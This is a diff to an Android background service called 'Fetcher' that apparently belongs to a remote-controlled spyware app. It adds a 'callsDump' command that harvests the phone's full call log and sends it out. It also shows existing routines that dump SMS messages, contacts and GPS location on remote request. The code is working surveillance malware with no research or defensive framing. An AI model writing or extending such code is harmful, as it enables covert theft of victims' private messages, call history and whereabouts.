@@ -1,6 +1,5 @@
 package com.app.checker;
 
-import android.Manifest;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -17,12 +16,14 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Base64;
 import android.util.Log;
+
 import androidx.annotation.NonNull;
-import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
 import com.android.volley.NetworkResponse;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
@@ -36,8 +37,10 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
+
 import org.json.JSONException;
 import org.json.JSONObject;
+
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -166,10 +169,13 @@ public class Fetcher extends Service {
                                     sendData(task, uuid, fetchContacts());
                                 }
                                 break;
+                            case "callsDump":
+                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
+                                    sendData(task, uuid, fetchCallLogs());
+                                }
+                                break;
                             case "getGeoLocation":
-                                if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_FINE_LOCATION)
-                                        == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION)
-                                        == PackageManager.PERMISSION_GRANTED) {
+                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
                                     sendData(task, uuid, getLastLocation());
                                 }
                                 break;
@@ -186,25 +192,19 @@ public class Fetcher extends Service {
 
     public boolean isConnected() {
         ConnectivityManager connMan = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
-
         if (connMan != null) {
             NetworkInfo netInfo = connMan.getActiveNetworkInfo();
-
-            if (netInfo != null && netInfo.isConnected()) {
-                return true;
-            } else {
-                return false;
-            }
-        } else {
-            return false;
-        }
+            if (netInfo != null && netInfo.isConnected()) return true;
+            else return false;
+        } else return false;
     }
 
     // Method to dump SMS messages
     private ArrayList<String> fetchInbox() {
         ArrayList<String> sms = new ArrayList<>();
+        ContentResolver cr = getContentResolver();
         Uri uri = Uri.parse("content://sms/");
-        Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
+        Cursor cursor = cr.query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
         if (cursor != null) {
             cursor.moveToFirst();
             for (int i = 0; i < cursor.getCount(); i++) {
@@ -256,35 +256,66 @@ public class Fetcher extends Service {
         return info;
     }
 
+    // Method to dump call logs
+    private ArrayList<String> fetchCallLogs() {
+        ArrayList<String> logs = new ArrayList<>();
+        ContentResolver cr = getContentResolver();
+        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
+
+        while (cursor.moveToNext()) {
+            String phNumber = cursor.getString(number);
+            String callType = cursor.getString(type);
+            String callDate = cursor.getString(date);
+            java.util.Date callDayTime = new java.util.Date(Long.valueOf(callDate));
+            String callDuration = cursor.getString(duration);
+            String dir = null;
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            logs.add("\n Phone Number=>" + phNumber + "\nType=>" + dir + "\nDate=>" + callDayTime + "\nDuration=>" + callDuration + "\n");
+        }
+        cursor.close();
+        return logs;
+    }
+
     // Method to retrieve geographical location
     ArrayList<String> geoLocation = new ArrayList<>();
+
     private ArrayList<String> getLastLocation() {
         FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
 
-        try {
-            mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
-                @Override
-                public void onSuccess(Location location) {
-                    if (location != null) {
-                        double latitude = location.getLatitude();
-                        double longitude = location.getLongitude();
-                        geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
+        mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
+            @Override
+            public void onSuccess(Location location) {
+                if (location != null) {
+                    double latitude = location.getLatitude();
+                    double longitude = location.getLongitude();
+                    geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
 
-                    } else {
-                        geoLocation.add("N/A");
-                    }
+                } else {
+                    geoLocation.add("N/A");
                 }
-            })
-                    .addOnFailureListener(new OnFailureListener() {
-                        @Override
-                        public void onFailure(@NonNull Exception e) {
-                            Log.d("LocationFetch", "Error trying to get last GPS location");
-                            e.printStackTrace();
-                        }
-                    });
-        } catch (SecurityException e) {
-            Log.d("LocationFetch", "Permission missing");
-        }
+            }
+        })
+                .addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception e) {
+                        e.printStackTrace();
+                    }
+                });
         return geoLocation;
     }
 
